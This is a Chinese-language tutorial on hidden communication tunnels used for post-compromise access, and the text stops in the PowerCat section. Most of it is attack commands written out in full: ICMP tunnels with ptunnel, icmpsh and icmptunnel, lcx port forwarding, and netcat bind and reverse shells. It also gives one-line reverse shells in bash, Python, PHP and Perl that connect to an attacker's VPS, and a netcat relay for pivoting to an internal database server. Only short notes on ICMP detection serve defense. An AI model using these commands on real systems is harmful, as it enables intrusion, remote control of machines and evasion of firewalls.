<h1 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h1><h2 id="一-隐藏通信隧道基础知识"><a href="#一-隐藏通信隧道基础知识" class="headerlink" title="一.隐藏通信隧道基础知识"></a>一.隐藏通信隧道基础知识</h2><h3 id="1-隐藏通信隧道概述"><a href="#1-隐藏通信隧道概述" class="headerlink" title="1. 隐藏通信隧道概述"></a>1. 隐藏通信隧道概述</h3><p>什么是隧道？这里的隧道就是一种绕过端口屏蔽的通信方式。隐藏通信隧道技术常用于在访问受限的网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输。</p>
<p>常用的隧道技术：</p>
<ul>
<li>网络层：IPv6隧道.ICMP隧道.GRE隧道</li>
<li>传输层：TCP隧道.UDP隧道.常规的端口转发。</li>
<li>应用层：SSH隧道.DNS隧道.HTTP隧道.HTTPS隧道</li>
</ul>
<h3 id="2-判断内网的连通性"><a href="#2-判断内网的连通性" class="headerlink" title="2. 判断内网的连通性"></a>2. 判断内网的连通性</h3><p>判断内网的连通性是指判断主机能否上外网等。常见的允许流量流出的端口有80.8080.443.53.110.123等。</p>
<h4 id="2-1-ICMP协议"><a href="#2-1-ICMP协议" class="headerlink" title="2.1 ICMP协议"></a>2.1 ICMP协议</h4><ul>
<li>ping：命令：ping &lt;IP地址&gt;</li>
</ul>
<h4 id="2-2-TCP协议"><a href="#2-2-TCP协议" class="headerlink" title="2.2 TCP协议"></a>2.2 TCP协议</h4><ul>
<li>netcat：“瑞士军刀”，简称“nc”。通过使用TCP&#x2F;UDP的网络连接来读写数据。使用命令：nc -zv &lt;IP 端口号&gt;</li>
</ul>
<h4 id="2-3-HTTP协议"><a href="#2-3-HTTP协议" class="headerlink" title="2.3 HTTP协议"></a>2.3 HTTP协议</h4><ul>
<li>curl：curl是一个利用URL规则在命令行下工作的综合文件传输工具。</li>
<li>使用命令：curl &lt; IP:端口号 &gt;</li>
</ul>
<h4 id="2-4-DNS协议"><a href="#2-4-DNS协议" class="headerlink" title="2.4 DNS协议"></a>2.4 DNS协议</h4><ul>
<li>nslookup（windows）</li>
<li>dig（linux）</li>
</ul>
<h4 id="2-5-代理服务器"><a href="#2-5-代理服务器" class="headerlink" title="2.5 代理服务器"></a>2.5 代理服务器</h4><p>有时候企业办公网利用代理服务器进行上网，判断方法：</p>
<ul>
<li>查看网络连接</li>
<li>查看主机名是否有”proxy“的主机</li>
<li>查看IE的代理</li>
</ul>
<h2 id="二-网络层隧道技术"><a href="#二-网络层隧道技术" class="headerlink" title="二.网络层隧道技术"></a>二.网络层隧道技术</h2><h3 id="1-IPv6隧道"><a href="#1-IPv6隧道" class="headerlink" title="1. IPv6隧道"></a>1. IPv6隧道</h3><p>IPv6隧道技术是指通过IPv4隧道传送的IPv6数据报文的技术。为了使在IPv4网络中传递IPv6报文，可以将IPv4作为载体，将IPv6报文整体封装在IPv4数据报文中。</p>
<ul>
<li>攻击方式：攻击者通过恶意软件来配置允许进行IPv6通信的设备。支持IPv6的隧道工具：socat.6tunnel.nt6tunnel等。</li>
<li>防御措施：了解IPv6漏洞，综合其他协议.设备来过滤IPv6通信。</li>
</ul>
<h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2. ICMP隧道"></a>2. ICMP隧道</h3><p>攻击者可以将TCP&#x2F;UDP数据封装在ICMP的ping包中，从而穿越防火墙。常见的icmp隧道工具：icmpsh.PingTunnel.icmptunnel.powershell icmp等</p>
<ul>
<li><p><strong>icmpsh</strong></p>
<ul>
<li>git clone <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a>  下载icmp</li>
<li>apt-get install python-impacket 安装python-impacket库</li>
<li>sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1 关闭系统ICMP应答（恢复则设置为0）</li>
<li>输入”.&#x2F;run.sh”并运行后输入目标的IP地址。</li>
<li>icmpsh.exe -t 192.168.1.7 -d 500 -b 30 -s 128 目标主机上运行此条命令，可在攻击机192.168.1.7上看到反弹的shell结果。</li>
</ul>
</li>
<li><p><strong>PingTunnel</strong>（可以为隧道加密）</p>
<ul>
<li><p>在VPS与Web服务器上安装编译</p>
<ul>
<li>tar xf PingTunnel-0.72.tar.gz</li>
<li>cd PingTunnel</li>
<li>make &amp;&amp; make install</li>
</ul>
</li>
<li><p>遇到报错–解决</p>
</li>
<li><p>运行PingTunnel</p>
<ul>
<li><p>服务器（IP：192.168.1.4）：ptunnel -x shuteer</p>
</li>
<li><p>VPS：ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.10 -dp 3389 -x shuteer</p>
</li>
<li><p>参数说明：</p>
<p>-x 指定 icmp 隧道连接验证密码</p>
<p>-lp 指定要监听的本地 tcp 端口</p>
<p>-da 指定要转发的机器的 ip 地址</p>
<p>-dp 指定要转发的机器的 tcp 端口</p>
<p>-p 指定icmp隧道另一端机器的 ip 地址</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="1-介绍-1"><a href="#1-介绍-1" class="headerlink" title="1) 介绍"></a>1) 介绍</h4><p>在内网中，如果攻击者使用 HTTP.DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p>
<p>因此我们便可以将 TCP&#x2F;UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p>
<h4 id="2-建立-ICMP-隧道工具"><a href="#2-建立-ICMP-隧道工具" class="headerlink" title="2) 建立 ICMP 隧道工具"></a>2) 建立 ICMP 隧道工具</h4><p>用于建立 ICMP 隧道的工具常见有：ptunnel.icmpsh.icmptunnel 等</p>
<h5 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h5><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yum -y install byacc</span><br><span class="line">yum -y install flex bison</span><br><span class="line"></span><br><span class="line">#安装libpcap依赖库</span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#安装PingTunnel</span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>ptunnel 常用命令介绍：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-p: 指定跳板服务器 IP 地址</span><br><span class="line">-lp: 监听本地 TCP 端口</span><br><span class="line">-da: 指定访问目标的内网 IP 地址</span><br><span class="line">-dp: 指定访问目标的端口</span><br><span class="line">-m: 设置隧道最大并发数</span><br><span class="line">-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）</span><br><span class="line">-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）</span><br><span class="line">-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）</span><br></pre></td></tr></table></figure>

<p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Kali 攻击机       172.16.214.6 (外网)</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">Linux Web 跳板机  172.16.214.5  (外网)</span><br><span class="line">|                192.168.7.5   (内网)</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">Win RDP 目标机    192.168.7.110 (内网)</span><br></pre></td></tr></table></figure>

<p>在 Kali 攻击机上执行以下命令</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix</span><br><span class="line">-p  指定跳板机外网IP</span><br><span class="line">-lp 指定本机的监听端口</span><br><span class="line">-da 指定目标机的内网IP</span><br><span class="line">-dp 指定目标机的端口</span><br><span class="line">-x 设置隧道密码</span><br></pre></td></tr></table></figure>

<p>在 Linux Web 跳板机上执行以下命令</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x teamssix</span><br></pre></td></tr></table></figure>

<p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-be6802a0028f08ab1ac00e8d80aafa13_720w.jpg" alt="img"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-be6802a0028f08ab1ac00e8d80aafa13_720w.jpg" alt="img"></p>
<h5 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h5><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git #下载工具</span><br><span class="line">apt-get install python-impacket # 安装依赖，或者 pip2 install impacket</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答</span><br></pre></td></tr></table></figure>

<p>icmpsh 常用命令介绍：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]</span><br><span class="line">-d milliseconds    请求时间间隔（毫秒）</span><br><span class="line">-o milliseconds    响应超时时间（毫秒）</span><br><span class="line">-s bytes           最大数据缓冲区大小（字节）</span><br></pre></td></tr></table></figure>

<p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22.3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机 IP：172.16.214.6</span><br><span class="line">目标机 IP：172.16.214.2</span><br></pre></td></tr></table></figure>

<p>在攻击机上运行：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 icmpsh_m.py 172.16.214.6 172.16.214.2</span><br></pre></td></tr></table></figure>

<p>在目标机上运行</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./icmpsh.exe -t 172.16.214.6</span><br></pre></td></tr></table></figure>

<p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-90f05b574fe3d135f6f4eaf68c3747d0_720w.jpg" alt="img"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-90f05b574fe3d135f6f4eaf68c3747d0_720w.jpg" alt="img"></p>
<h5 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h5><p>icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机 IP：172.16.214.6</span><br><span class="line">目标机 IP：172.16.214.5</span><br></pre></td></tr></table></figure>

<p>在攻击机上运行：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all        # 禁用 ICMP echo 回复，防止内核自己对ping包进行响应</span><br><span class="line">./icmptunnel -s # 开启服务端模式</span><br></pre></td></tr></table></figure>

<p>在攻击机上新开启一个终端运行：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0  # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)</span><br></pre></td></tr></table></figure>

<p>在目标机上运行：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">./icmptunnel 172.16.214.6</span><br></pre></td></tr></table></figure>

<p>在目标机上新开启一个终端运行：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0  # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)</span><br></pre></td></tr></table></figure>

<p>至此，已经通过 ICMP 建立了一个点对点隧道。</p>
<p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.0.0.2</span><br></pre></td></tr></table></figure>



<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-2da20061717a1d95915bfa16a1406391_720w.jpg" alt="img"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-2da20061717a1d95915bfa16a1406391_720w.jpg" alt="img"></p>
<h3 id="3-防御ICMP隧道攻击的方法"><a href="#3-防御ICMP隧道攻击的方法" class="headerlink" title="3. 防御ICMP隧道攻击的方法"></a>3. 防御ICMP隧道攻击的方法</h3><ul>
<li>检测同一来源的ICMP数据包的流量，一个正常的icmp命令每秒最多发送2个数据包。</li>
<li>注意那些payload大于64bit的icmp数据包。</li>
<li>寻找响应数据包中的payload与请求数据包中的payload不一致的ICMP数据包。</li>
<li>检查ICMP数据包的协议标签。例如：icmptunnel会在所有的icmp payload前面添加”TUNL“标记来标识隧道。</li>
</ul>
<h2 id="三-传输层隧道技术"><a href="#三-传输层隧道技术" class="headerlink" title="三.传输层隧道技术"></a>三.传输层隧道技术</h2><p>包括tcp,udp隧道，常规端口转发</p>
<h3 id="1-lcx端口转发"><a href="#1-lcx端口转发" class="headerlink" title="1. lcx端口转发"></a>1. lcx端口转发</h3><p>​       lcx是一个基于Socket套接字实现的端口转化工具，Windows版为lcx.exe，Linux版为portmap。Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户连接；另一端为客户端，通过传入服务端的IP地址与端口，才能主动与服务器连接。</p>
<ul>
<li><strong>内网端口转发</strong></li>
</ul>
<p>举例：将目标主机的3389端口的所有数据转发到公网VPS的4444端口上。在目标主机上执行命令，命令如下：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx<span class="selector-class">.exe</span> -slave &lt;公网IP地址&gt; <span class="number">4444</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>

<p>将VPS上的4444端口上监听的所有数据转发到5555端口上，命令如下：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx<span class="selector-class">.exe</span> -listen <span class="number">4444</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>

<p>然后在VPS上用mstsc登录主机127.0.0.1的5555端口，即可访问目标服务器的3389端口。</p>
<ul>
<li><strong>本地端口转发</strong></li>
</ul>
<p>如果目标服务器由于防火墙的限制，部分端口如3389的数据无法通过防火墙，这时就可以将目标服务器相应端口的数据透传到防火墙允许的端口如53。在目标主机上执行如下命令即可。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 53 &lt;目标主机IP地址&gt; 3389</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2. netcat"></a>2. netcat</h3><p>netcat简称nc，作为安全界的瑞士军刀，功能非常强大。</p>
<h4 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h4><p>安装的具体步骤见<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=www.baidu.com">www.baidu.com</a></p>
<h4 id="2-2-简单使用参数"><a href="#2-2-简单使用参数" class="headerlink" title="2.2 简单使用参数"></a>2.2 简单使用参数</h4><p>-d 后台模式</p>
<p>-e 程序重定向</p>
<p>-g &lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个；</p>
<p>-G &lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数；</p>
<p>-h 在线帮助；</p>
<p>-i &lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口；</p>
<p>-l 使用监听模式，管控传入的资料；</p>
<p>-n 直接使用IP地址，而不通过域名服务器；</p>
<p>-o &lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</p>
<p>-p &lt;通信端口&gt; 设置本地主机使用的通信端口；</p>
<p>-r 随机指定本地与远端主机的通信端口；</p>
<p>-s &lt;来源位址&gt; 设置本地主机送出数据包的IP地址；</p>
<p>-u 使用UDP传输协议；</p>
<p>-v 详细输出；</p>
<p>-w &lt;超时秒数&gt; 设置等待连线的时间；</p>
<p>-z 将输入输出关掉，只在扫描通信端口时使用。</p>
<p>以上为netcat的参数信息，需要实现具体功能时到上网查具体的命令即可。</p>
<p>常用的具体功能有：</p>
<ul>
<li>Banner抓取</li>
<li>连接远程主机</li>
<li>端口扫描</li>
<li>端口监听</li>
<li>文件传输</li>
<li>简易聊天</li>
<li>…</li>
</ul>
<h4 id="2-3-获取Shell"><a href="#2-3-获取Shell" class="headerlink" title="2.3 获取Shell"></a>2.3 获取Shell</h4><p>​       shell分两种，一种为正向shell，一种为反向shell。如果客户端连接服务器，客户端想得获取服务器的shell，就称为正向shell。如果客户端连接服务器，服务器想要获取客户端的shell，就称为反向shell。</p>
<ul>
<li>正向Shell获取</li>
</ul>
<p>目标主机上（IP：192.168.1.11）监听4444端口：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">4444</span> -e /bin/sh                           <span class="comment">//linux</span></span><br><span class="line">nc -lvp <span class="number">4444</span> -e C:\WINDOWS\system32\cmd.exe      <span class="comment">//windows</span></span><br></pre></td></tr></table></figure>

<p>注：-l 表示监听模式，-v表示详细输出，-p 指定端口</p>
<p>VPS连接目标主机的4444端口：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span>.<span class="number">1.11</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<ul>
<li>反向Shell获取</li>
</ul>
<p>本地主机（VPS）监听9999端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>

<p>在目标主机上进行连接：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span><span class="number">.11</span><span class="number">.144</span> <span class="number">9999</span> -e /bin/sh        <span class="comment">//linux  </span></span><br><span class="line">nc <span class="number">192.168</span><span class="number">.11</span><span class="number">.144</span> <span class="number">9999</span> -e C:\WINDOWS\system32\cmd.exe  <span class="comment">//windows</span></span><br></pre></td></tr></table></figure>

<h4 id="2-4-在目标主机中没有nc时获取反向Shell"><a href="#2-4-在目标主机中没有nc时获取反向Shell" class="headerlink" title="2.4 在目标主机中没有nc时获取反向Shell"></a>2.4 在目标主机中没有nc时获取反向Shell</h4><h5 id="2-4-1-python反向Shell"><a href="#2-4-1-python反向Shell" class="headerlink" title="2.4.1 python反向Shell"></a>2.4.1 python反向Shell</h5><ul>
<li>VPS上监听本地2222端口：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>

<ul>
<li>在目标主机上执行命令：</li>
</ul>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> socket,subprocess,os;s=socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET,socket.SOCK_STREAM);s.<span class="title function_ invoke__">connect</span>((<span class="string">&quot;192.168.1.4&quot;</span>,<span class="number">2222</span>));os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">0</span>); os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">1</span>); os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">2</span>);p=subprocess.<span class="title function_ invoke__">call</span>([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="2-4-2-bash反向Shell"><a href="#2-4-2-bash反向Shell" class="headerlink" title="2.4.2 bash反向Shell"></a>2.4.2 bash反向Shell</h5><ul>
<li>VPS上监听本地4444端口：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<ul>
<li>在目标主机上执行命令：</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.1.4/</span><span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h5 id="2-4-3-PHP反向Shell"><a href="#2-4-3-PHP反向Shell" class="headerlink" title="2.4.3 PHP反向Shell"></a>2.4.3 PHP反向Shell</h5><ul>
<li>在VPS上监听本地2222端口：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>

<ul>
<li>在目标主机上执行下面命令：</li>
</ul>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;<span class="subst">$sock</span>=fsockopen(&quot;192.168.1.4&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="3-4-4-perl反向Shell"><a href="#3-4-4-perl反向Shell" class="headerlink" title="3.4.4 perl反向Shell"></a>3.4.4 perl反向Shell</h5><ul>
<li>在VPS上监听本地4444端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<ul>
<li>如果目标机上使用的是Perl语言，则我们可以使用Perl来建立反向Shell。目标主机上执行命令：</li>
</ul>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;<span class="subst">$i</span>=”192.168.1.4″;<span class="subst">$p</span>=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in(<span class="subst">$p</span>,inet_aton(<span class="subst">$i</span>))))&#123;open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-5-内网代理"><a href="#2-5-内网代理" class="headerlink" title="2.5 内网代理"></a>2.5 内网代理</h4><p>拓扑图如下：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111657244.png" alt="image-20220311165758101"></p>
<p>测试环境：攻击者VPS（KALI）；一个小型内网；三台服务器。假设已经取得Web服务器权限，kali不能访问数据库服务器linux，web服务器可以访问数据库服务器。</p>
<p>测试目标：获取数据库服务器的shell。步骤如下：</p>
<ul>
<li>首先要在VPS上监听3333端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>

<ul>
<li>数据库服务器上允许命令：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 3333 -e /bin/sh</span><br></pre></td></tr></table></figure>

<ul>
<li>最后在web服务器上执行命令：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v <span class="number">192.168</span>.<span class="number">1.4</span> <span class="number">3333</span> -c &quot;nc -v <span class="number">1.1</span>.<span class="number">1.200</span> <span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure>

<p>注：-e 表示程序重定向，-c 执行命令</p>
<h3 id="3-PowerCat"><a href="#3-PowerCat" class="headerlink" title="3. PowerCat"></a>3. PowerCat</h3><p>PowerCat可以说是nc的PowerShell版本，PowerCat可以通过执行命令回到本地运行，也可以使用远程权限运行。里面也加入了众多好用的功能，如文件上传，smb协议支持，中继模式，生成payload，端口扫描等等。</p>
<h4 id="3-1-下载PowerCat"><a href="#3-1-下载PowerCat" class="headerlink" title="3.1 下载PowerCat"></a>3.1 下载PowerCat</h4><p>具体下载安装步骤百度即可。</p>
<h4 id="3-2-测试环境"><a href="#3-2-测试环境" class="headerlink" title="3.2 测试环境"></a>3.2 测试环境</h4><p>环境介绍：</p>
<p>Kali：192.168.227.129；</p>
<p>Windows7：192.168.227.161.192.168.130.150</p>
<p>Windows server 2008：192.168.130.100</p>
<p><img src="https://upload-images.jianshu.io/upload_images/23335085-294d85d8d092dd1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/734/format/webp" alt="img"></p>
<p>image.png</p>
<h4 id="3-3-通过nc正向连接PowerCat"><a href="#3-3-通过nc正向连接PowerCat" class="headerlink" title="3.3 通过nc正向连接PowerCat"></a>3.3 通过nc正向连接PowerCat</h4><ul>
<li>Windows7执行命令：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -<span class="selector-tag">p</span> <span class="number">8080</span> -e cmd<span class="selector-class">.exe</span> -v</span><br></pre></td></tr></table></figure>

<ul>
<li>Kali上运行：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span>.<span class="number">277.161</span> <span class="number">8080</span> -vv</span><br></pre></td></tr></table></figure>

<p>注：-l 监听模式；-p 指定监听端口；-e 指定要启动进程的名称；-v 显示详情</p>
<h4 id="3-4-通过nc反向连接PowerCat"><a href="#3-4-通过nc反向连接PowerCat" class="headerlink" title="3.4 通过nc反向连接PowerCat"></a>3.4 通过nc反向连接PowerCat</h4><ul>
<li>Kali上运行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -l -p 8888 -vv</span><br></pre></td></tr></table></figure>

<ul>
